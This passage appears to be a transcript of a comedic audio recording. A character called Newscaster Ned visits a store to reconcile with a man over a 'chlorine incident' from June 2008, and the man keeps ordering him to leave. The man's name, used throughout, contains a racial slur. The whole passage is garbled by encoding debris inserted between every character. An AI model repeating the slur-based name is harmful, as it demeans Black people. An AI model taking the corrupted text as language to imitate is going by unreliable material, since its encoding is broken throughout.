‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äés‚Äét‚Äéo‚Äér‚Äée‚Äé'‚Äés‚Äé ‚Äéd‚Äéo‚Äéo‚Äér‚Äé ‚Äéa‚Äél‚Äéa‚Äér‚Äém‚Äé ‚Äéc‚Äéa‚Äén‚Äé ‚Äéb‚Äée‚Äé ‚Äéh‚Äée‚Äéa‚Äér‚Äéd‚Äé ‚Äéa‚Äés‚Äé ‚Äéh‚Äée‚Äé ‚Äég‚Äéo‚Äée‚Äés‚Äé ‚Äéi‚Äén‚Äés‚Äéi‚Äéd‚Äée‚Äé.‚Äé ‚Äé""‚ÄéE‚Äév‚Äée‚Äér‚Äéy‚Äé ‚ÄéM‚Äéo‚Äér‚Äén‚Äéi‚Äén‚Äég‚Äé""‚Äé ‚Äéb‚Äéy‚Äé ‚ÄéS‚Äéu‚Äég‚Äéa‚Äér‚Äé ‚ÄéR‚Äéa‚Äéy‚Äé ‚Äéf‚Äéa‚Äéi‚Äén‚Äét‚Äél‚Äéy‚Äé ‚Äép‚Äél‚Äéa‚Äéy‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äéa‚Äéc‚Äék‚Äég‚Äér‚Äéo‚Äéu‚Äén‚Äéd‚Äé,‚Äé ‚Äéw‚Äéh‚Äéi‚Äél‚Äée‚Äé ‚Äéw‚Äée‚Äé ‚Äég‚Äée‚Äét‚Äé ‚Äéa‚Äé ‚Äég‚Äéo‚Äéo‚Äéd‚Äé ‚Äév‚Äéi‚Äée‚Äéw‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéi‚Äén‚Äés‚Äéi‚Äéd‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé'‚Äés‚Äé ‚Äép‚Äéo‚Äéc‚Äék‚Äée‚Äét‚Äé.‚Äé]‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéH‚Äée‚Äél‚Äél‚Äéo‚Äé,‚Äé ‚ÄéI‚Äé'‚Äém‚Äé ‚Äéh‚Äée‚Äér‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äés‚Äée‚Äée‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé.‚Äé

E‚Äém‚Äép‚Äél‚Äéo‚Äéy‚Äée‚Äée‚Äé:‚Äé ‚ÄéY‚Äée‚Äéa‚Äéh‚Äé,‚Äé ‚Äéh‚Äée‚Äé'‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äér‚Äéo‚Äéo‚Äém‚Äé ‚Äéb‚Äéa‚Äéc‚Äék‚Äé ‚Äéh‚Äée‚Äér‚Äée‚Äé.‚Äé

[‚ÄéW‚Äée‚Äé ‚Äéc‚Äéo‚Äém‚Äée‚Äé ‚Äéu‚Äép‚Äéo‚Äén‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé,‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äéi‚Äés‚Äé ‚Äéf‚Äéi‚Äéx‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äén‚Äé ‚ÄéR‚ÄéC‚Äé ‚Äéc‚Äéa‚Äér‚Äé.‚Äé ‚ÄéH‚Äéi‚Äés‚Äé ‚Äér‚Äée‚Äém‚Äéa‚Äér‚Äék‚Äés‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äéo‚Äéc‚Äéc‚Äéa‚Äés‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéi‚Äén‚Äét‚Äée‚Äér‚Äér‚Äéu‚Äép‚Äét‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚Äéw‚Äéh‚Äéo‚Äée‚Äév‚Äée‚Äér‚Äé ‚Äéh‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚Äéh‚Äée‚Äél‚Äép‚Äéi‚Äén‚Äég‚Äé.‚Äé ‚ÄéJ‚Äéu‚Äéd‚Äég‚Äéi‚Äén‚Äég‚Äé ‚Äéb‚Äéy‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéa‚Äéu‚Äéd‚Äéi‚Äéo‚Äé,‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé ‚Äéi‚Äés‚Äé ‚Äés‚Äét‚Äéa‚Äén‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äér‚Äée‚Äél‚Äéa‚Äét‚Äéi‚Äév‚Äée‚Äél‚Äéy‚Äé ‚Äéc‚Äél‚Äéo‚Äés‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äéh‚Äéi‚Äém‚Äé,‚Äé ‚Äéc‚Äél‚Äéo‚Äés‚Äée‚Äé ‚Äée‚Äén‚Äéo‚Äéu‚Äég‚Äéh‚Äé ‚Äét‚Äéo‚Äé ‚Äéo‚Äéc‚Äéc‚Äéa‚Äés‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéh‚Äée‚Äéa‚Äér‚Äé ‚Äéw‚Äéh‚Äéo‚Äée‚Äév‚Äée‚Äér‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé ‚Äéi‚Äés‚Äé ‚Äés‚Äép‚Äée‚Äéa‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé.‚Äé]‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéW‚Äée‚Äél‚Äél‚Äé,‚Äé ‚ÄéI‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äé,‚Äé ‚Äéy‚Äéo‚Äéu‚Äé'‚Äér‚Äée‚Äé,‚Äé ‚Äéy‚Äéo‚Äéu‚Äé,‚Äé ‚Äéy‚Äéo‚Äéu‚Äé'‚Äél‚Äél‚Äé ‚Äéj‚Äéu‚Äés‚Äét‚Äé ‚Äés‚Äée‚Äée‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéb‚Äéy‚Äé ‚Äér‚Äéu‚Äén‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äét‚Äé.‚Äé ‚ÄéI‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äé,‚Äé ‚Äéi‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äér‚Äéu‚Äén‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äék‚Äéa‚Äéy‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äéd‚Äéa‚Äéy‚Äé.‚Äé ‚ÄéB‚Äéu‚Äét‚Äé ‚Äéj‚Äéu‚Äés‚Äét‚Äé,‚Äé ‚Äéy‚Äéo‚Äéu‚Äé ‚Äék‚Äén‚Äéo‚Äéw‚Äé,‚Äé ‚Äéa‚Äéd‚Äéj‚Äéu‚Äés‚Äét‚Äé ‚Äéi‚Äét‚Äé ‚Äéo‚Äén‚Äée‚Äé ‚Äéw‚Äéa‚Äéy‚Äé ‚Äéo‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äéd‚Äée‚Äép‚Äée‚Äén‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äée‚Äém‚Äép‚Äée‚Äér‚Äéa‚Äét‚Äéu‚Äér‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äée‚Äév‚Äée‚Äér‚Äéy‚Äét‚Äéh‚Äéi‚Äén‚Äég‚Äé ‚Äée‚Äél‚Äés‚Äée‚Äé.‚Äé ‚ÄéB‚Äéu‚Äét‚Äé,‚Äé ‚Äéy‚Äéo‚Äéu‚Äé ‚Äék‚Äén‚Äéo‚Äéw‚Äé,‚Äé ‚Äéi‚Äét‚Äé ‚Äéj‚Äéu‚Äés‚Äét‚Äé,‚Äé ‚Äéi‚Äét‚Äé'‚Äés‚Äé ‚Äén‚Äéo‚Äét‚Äé ‚Äéu‚Äés‚Äéu‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äém‚Äéu‚Äéc‚Äéh‚Äé.‚Äé ‚ÄéB‚Äéy‚Äé ‚Äéc‚Äéh‚Äéa‚Äén‚Äég‚Äéi‚Äén‚Äég‚Äé ‚Äéf‚Äéu‚Äée‚Äél‚Äé,‚Äé ‚Äéi‚Äét‚Äé ‚Äéd‚Äéo‚Äée‚Äés‚Äén‚Äé'‚Äét‚Äé ‚Äéu‚Äés‚Äéu‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéc‚Äéh‚Äéa‚Äén‚Äég‚Äée‚Äé.‚Äé.‚Äé.‚Äé ‚Äét‚Äéu‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äém‚Äéu‚Äéc‚Äéh‚Äé.‚Äé ‚ÄéM‚Äém‚Äék‚Äéa‚Äéy‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéU‚Äéh‚Äé-‚Äéh‚Äéu‚Äéh‚Äé.‚Äé ‚ÄéY‚Äée‚Äéa‚Äéh‚Äé,‚Äé ‚Äén‚Äéo‚Äé,‚Äé ‚Äéi‚Äét‚Äé'‚Äél‚Äél‚Äé ‚Äéb‚Äée‚Äé ‚Äéf‚Äéi‚Äén‚Äée‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéR‚Äéi‚Äég‚Äéh‚Äét‚Äé,‚Äé ‚Äéy‚Äée‚Äéa‚Äéh‚Äé,‚Äé ‚Äéi‚Äét‚Äé'‚Äél‚Äél‚Äé ‚Äéb‚Äée‚Äé ‚Äéf‚Äéi‚Äén‚Äée‚Äé.‚Äé ‚Äé[‚Äép‚Äéa‚Äéu‚Äés‚Äée‚Äé]‚Äé ‚ÄéO‚Äék‚Äéa‚Äéy‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéO‚Äék‚Äéa‚Äéy‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚Äém‚Äéa‚Äéd‚Äée‚Äé ‚Äéi‚Äét‚Äé?‚Äé

[‚ÄéT‚Äéh‚Äée‚Äé ‚Äér‚Äée‚Äéc‚Äéo‚Äér‚Äéd‚Äée‚Äér‚Äé ‚Äés‚Äée‚Äée‚Äém‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äém‚Äéo‚Äév‚Äée‚Äé ‚Äéa‚Äéw‚Äéa‚Äéy‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéo‚Äén‚Äév‚Äée‚Äér‚Äés‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äé ‚Äél‚Äéo‚Äén‚Äég‚Äé ‚Äés‚Äéi‚Äél‚Äée‚Äén‚Äéc‚Äée‚Äé ‚Äéf‚Äéo‚Äél‚Äél‚Äéo‚Äéw‚Äés‚Äé.‚Äé ‚ÄéV‚Äéa‚Äér‚Äéi‚Äéo‚Äéu‚Äés‚Äé ‚Äés‚Äét‚Äéo‚Äér‚Äée‚Äé ‚Äén‚Äéo‚Äéi‚Äés‚Äée‚Äés‚Äé ‚Äéo‚Äéc‚Äéc‚Äéu‚Äér‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äéa‚Äéc‚Äék‚Äég‚Äér‚Äéo‚Äéu‚Äén‚Äéd‚Äé,‚Äé ‚Äéi‚Äén‚Äéc‚Äél‚Äéu‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äée‚Äél‚Äél‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äéo‚Äén‚Äée‚Äé ‚Äéo‚Äép‚Äée‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äér‚Äéo‚Äén‚Äét‚Äé ‚Äéd‚Äéo‚Äéo‚Äér‚Äé.‚Äé]‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéO‚Äék‚Äéa‚Äéy‚Äé.‚Äé ‚ÄéA‚Äél‚Äér‚Äéi‚Äég‚Äéh‚Äét‚Äé.‚Äé ‚ÄéS‚Äéo‚Äéu‚Äén‚Äéd‚Äés‚Äé ‚Äég‚Äéo‚Äéo‚Äéd‚Äé.‚Äé ‚ÄéM‚Äém‚Äé-‚Äéh‚Äém‚Äé.‚Äé ‚ÄéB‚Äéy‚Äée‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéH‚Äée‚Äél‚Äél‚Äéo‚Äé,‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé.‚Äé ‚ÄéI‚Äé ‚Äés‚Äée‚Äée‚Äé,‚Äé ‚Äéu‚Äéh‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéY‚Äéo‚Äéu‚Äé'‚Äév‚Äée‚Äé ‚Äéb‚Äée‚Äée‚Äén‚Äé,‚Äé ‚ÄéI‚Äé ‚Äés‚Äée‚Äée‚Äé ‚Äéy‚Äéo‚Äéu‚Äé'‚Äér‚Äée‚Äé ‚Äél‚Äéo‚Äéo‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéw‚Äée‚Äél‚Äél‚Äé.‚Äé ‚ÄéH‚Äéa‚Äév‚Äée‚Äén‚Äé'‚Äét‚Äé ‚Äéc‚Äéh‚Äéa‚Äén‚Äég‚Äée‚Äéd‚Äé ‚Äém‚Äéu‚Äéc‚Äéh‚Äé ‚Äés‚Äéi‚Äén‚Äéc‚Äée‚Äé,‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äép‚Äéa‚Äés‚Äét‚Äé ‚Äéa‚Äél‚Äém‚Äéo‚Äés‚Äét‚Äé ‚Äét‚Äéw‚Äéo‚Äé ‚Äéy‚Äée‚Äéa‚Äér‚Äés‚Äé.‚Äé ‚ÄéA‚Äén‚Äéd‚Äé,‚Äé ‚Äéy‚Äée‚Äéa‚Äéh‚Äé,‚Äé ‚Äéi‚Äét‚Äé ‚Äéh‚Äéa‚Äés‚Äé ‚Äéb‚Äée‚Äée‚Äén‚Äé,‚Äé ‚Äéu‚Äéh‚Äé,‚Äé ‚Äéa‚Äél‚Äém‚Äéo‚Äés‚Äét‚Äé ‚Äét‚Äéw‚Äéo‚Äé ‚Äéy‚Äée‚Äéa‚Äér‚Äés‚Äé ‚Äés‚Äéi‚Äén‚Äéc‚Äée‚Äé.‚Äé.‚Äé.‚Äé ‚Äéu‚Äéh‚Äé,‚Äé ‚Äéw‚Äéh‚Äéa‚Äét‚Äé ‚Äéh‚Äéa‚Äép‚Äép‚Äée‚Äén‚Äée‚Äéd‚Äé,‚Äé ‚Äéu‚Äéh‚Äé,‚Äé ‚ÄéJ‚Äéu‚Äén‚Äée‚Äé-‚Äé ‚ÄéJ‚Äéu‚Äén‚Äée‚Äé ‚Äé2‚Äé0‚Äé0‚Äé8‚Äé.‚Äé ‚ÄéB‚Äéu‚Äét‚Äé,‚Äé ‚Äéu‚Äéh‚Äé,‚Äé ‚ÄéI‚Äé ‚Äéc‚Äéa‚Äém‚Äée‚Äé ‚Äéb‚Äéa‚Äéc‚Äék‚Äé ‚Äéh‚Äéo‚Äép‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé,‚Äé ‚Äéu‚Äéh‚Äé,‚Äé ‚Äéw‚Äée‚Äé ‚Äéc‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äép‚Äéu‚Äét‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéb‚Äée‚Äéh‚Äéi‚Äén‚Äéd‚Äé ‚Äéu‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé.‚Äé.‚Äé.‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéN‚Äéo‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéC‚Äéo‚Äém‚Äée‚Äé ‚Äéo‚Äén‚Äé.‚Äé ‚ÄéI‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äé,‚Äé ‚Äéi‚Äét‚Äé ‚Äéh‚Äéa‚Äés‚Äé ‚Äéb‚Äée‚Äée‚Äén‚Äé ‚Äéa‚Äél‚Äém‚Äéo‚Äés‚Äét‚Äé ‚Äét‚Äéw‚Äéo‚Äé ‚Äéy‚Äée‚Äéa‚Äér‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéi‚Äét‚Äé'‚Äés‚Äé ‚Äéj‚Äéu‚Äés‚Äét‚Äé ‚Äéb‚Äée‚Äée‚Äén‚Äé ‚Äéo‚Äén‚Äé ‚Äém‚Äéy‚Äé ‚Äém‚Äéi‚Äén‚Äéd‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äés‚Äéo‚Äé ‚Äél‚Äéo‚Äén‚Äég‚Äé,‚Äé ‚Äéj‚Äéu‚Äés‚Äét‚Äé ‚Äéb‚Äée‚Äé.‚Äé.‚Äé.‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéN‚Äéo‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéB‚Äéu‚Äét‚Äé,‚Äé ‚Äéc‚Äéa‚Äén‚Äé'‚Äét‚Äé ‚Äéw‚Äée‚Äé ‚Äéj‚Äéu‚Äés‚Äét‚Äé ‚Äéf‚Äéo‚Äér‚Äég‚Äéi‚Äév‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéf‚Äéo‚Äér‚Äég‚Äée‚Äét‚Äé?‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéN‚Äéo‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéC‚Äé'‚Äém‚Äéo‚Äén‚Äé,‚Äé ‚Äét‚Äéo‚Äé ‚Äéh‚Äéa‚Äév‚Äée‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé.‚Äé.‚Äé.‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéN‚Äéo‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚Äé.‚Äé.‚Äé.‚Äéw‚Äée‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚Äéo‚Äén‚Äé ‚Äém‚Äéy‚Äé ‚Äéb‚Äéa‚Äéc‚Äék‚Äé.‚Äé.‚Äé.‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéN‚Äéo‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéA‚Äén‚Äéd‚Äé ‚ÄéI‚Äé ‚Äéh‚Äéa‚Äév‚Äée‚Äé ‚Äér‚Äée‚Äéa‚Äél‚Äél‚Äéy‚Äé.‚Äé.‚Äé.‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéN‚Äéo‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚Äé.‚Äé.‚Äé.‚Äém‚Äéi‚Äés‚Äés‚Äée‚Äéd‚Äé ‚Äéc‚Äéo‚Äém‚Äéi‚Äén‚Äég‚Äé ‚Äéh‚Äée‚Äér‚Äée‚Äé.‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéN‚Äéo‚Äé.‚Äé ‚ÄéN‚Äéo‚Äé.‚Äé ‚ÄéY‚Äéo‚Äéu‚Äé ‚Äén‚Äée‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äél‚Äée‚Äéa‚Äév‚Äée‚Äé ‚Äén‚Äéo‚Äéw‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéI‚Äé'‚Äém‚Äé,‚Äé ‚ÄéI‚Äé'‚Äém‚Äé ‚Äéa‚Äé ‚Äéb‚Äée‚Äét‚Äét‚Äée‚Äér‚Äé ‚Äép‚Äée‚Äér‚Äés‚Äéo‚Äén‚Äé.‚Äé.‚Äé.‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéY‚Äéo‚Äéu‚Äé ‚Äén‚Äée‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äél‚Äée‚Äéa‚Äév‚Äée‚Äé ‚Äén‚Äéo‚Äéw‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéC‚Äé'‚Äém‚Äéo‚Äén‚Äé,‚Äé ‚Äéw‚Äéh‚Äéa‚Äét‚Äé?‚Äé ‚ÄéC‚Äéo‚Äém‚Äée‚Äé ‚Äéo‚Äén‚Äé,‚Äé ‚Äéd‚Äéu‚Äéd‚Äée‚Äé.‚Äé.‚Äé.‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéN‚Äéo‚Äé!‚Äé ‚ÄéY‚Äéo‚Äéu‚Äé ‚Äén‚Äée‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äél‚Äée‚Äéa‚Äév‚Äée‚Äé ‚Äén‚Äéo‚Äéw‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéH‚Äéo‚Äéw‚Äé ‚Äéc‚Äéa‚Äén‚Äé ‚Äéy‚Äéo‚Äéu‚Äé ‚Äéb‚Äée‚Äé ‚Äés‚Äéo‚Äé ‚Äéh‚Äée‚Äéa‚Äér‚Äét‚Äél‚Äée‚Äés‚Äés‚Äé?‚Äé ‚ÄéI‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äé,‚Äé ‚Äéy‚Äéo‚Äéu‚Äé'‚Äér‚Äée‚Äé,‚Äé ‚ÄéI‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äé,‚Äé ‚Äéy‚Äéo‚Äéu‚Äé'‚Äér‚Äée‚Äé ‚Äéo‚Äéb‚Äév‚Äéi‚Äéo‚Äéu‚Äés‚Äél‚Äéy‚Äé ‚Äén‚Äéo‚Äét‚Äé ‚Äéa‚Äés‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äé ‚Äéa‚Äés‚Äé ‚Äéo‚Äén‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äéo‚Äés‚Äée‚Äé ‚Äét‚Äér‚Äéo‚Äél‚Äél‚Äés‚Äé ‚ÄéI‚Äé'‚Äév‚Äée‚Äé ‚Äéb‚Äée‚Äée‚Äén‚Äé ‚Äéd‚Äée‚Äéa‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé.‚Äé.‚Äé.‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéY‚Äéo‚Äéu‚Äé ‚Äén‚Äée‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äél‚Äée‚Äéa‚Äév‚Äée‚Äé ‚Äén‚Äéo‚Äéw‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéI‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äé,‚Äé ‚Äéc‚Äéo‚Äém‚Äée‚Äé ‚Äéo‚Äén‚Äé,‚Äé ‚ÄéI‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äé,‚Äé ‚Äéo‚Äéb‚Äév‚Äéi‚Äéo‚Äéu‚Äés‚Äél‚Äéy‚Äé ‚Äéy‚Äéo‚Äéu‚Äé ‚Äéh‚Äéa‚Äév‚Äée‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äét‚Äéh‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äég‚Äéa‚Äéi‚Äén‚Äés‚Äét‚Äé ‚Äém‚Äée‚Äé,‚Äé ‚Äé[‚Äéf‚Äéo‚Äéu‚Äér‚Äé ‚Äéb‚Äée‚Äée‚Äép‚Äéi‚Äén‚Äég‚Äé ‚Äén‚Äéo‚Äéi‚Äés‚Äée‚Äés‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äéh‚Äée‚Äéa‚Äér‚Äéd‚Äé,‚Äé ‚Äép‚Äéo‚Äés‚Äés‚Äéi‚Äéb‚Äél‚Äéy‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé ‚Äéd‚Äéi‚Äéa‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚Äé9‚Äé1‚Äé1‚Äé]‚Äé ‚Äéb‚Äée‚Äéc‚Äéa‚Äéu‚Äés‚Äée‚Äé ‚Äéa‚Äés‚Äéi‚Äéd‚Äée‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéh‚Äél‚Äéo‚Äér‚Äéi‚Äén‚Äée‚Äé ‚Äéi‚Äén‚Äéc‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äé,‚Äé ‚ÄéI‚Äé ‚Äéj‚Äéu‚Äés‚Äét‚Äé ‚Äéw‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äél‚Äéi‚Äék‚Äée‚Äé ‚Äét‚Äéo‚Äé 